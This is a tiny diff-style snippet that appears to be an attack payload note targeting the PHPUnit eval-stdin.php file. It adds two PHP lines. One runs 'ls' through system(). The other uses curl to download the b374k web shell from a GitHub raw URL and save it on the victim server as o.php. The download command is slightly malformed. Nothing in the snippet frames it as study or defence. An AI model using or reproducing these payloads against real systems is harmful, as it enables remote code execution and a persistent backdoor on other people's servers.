@@ -1,0 +1,5 @@
+File: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+Path: https://hastebin.com/raw/umuvejoyeg
+
+<?php system('ls');?>
+<?php system('curl wget https://raw.githubusercontent.com/The404Hacking/b374k-mini/master/b374k.php -o o.php');?>
